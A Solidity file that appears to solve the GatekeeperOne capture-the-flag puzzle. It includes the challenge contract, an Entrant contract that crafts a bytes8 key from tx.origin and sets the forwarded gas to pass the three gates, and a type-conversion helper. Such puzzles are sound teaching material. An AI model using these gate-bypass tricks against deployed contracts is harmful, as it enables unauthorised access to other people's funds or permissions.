// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Entrant {
    GatekeeperOne public gates;

    constructor(GatekeeperOne _gates) {
        gates = _gates;
    }

    function open(uint256 _gas) public {
        bytes8 key;
        uint256 num = uint16(uint160(tx.origin));
        key = bytes8(uint64(num + type(uint32).max + 1));
        gates.enter{gas: _gas}(key);
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Calculator {
    uint256 public max16 = type(uint16).max;
    uint256 public max32 = type(uint32).max;
    uint256 public max64 = type(uint64).max;
    uint256 public max256 = type(uint256).max;

    function toU16fromAddr(address addr) public pure returns (uint16) {
        return uint16(uint160(addr));
    }

    function toU32(uint256 num) public pure returns (uint32) {
        return uint32(num);
    }

    function toBytes8(uint256 val) public pure returns (bytes8) {
        return bytes8(uint64(val));
    }
}
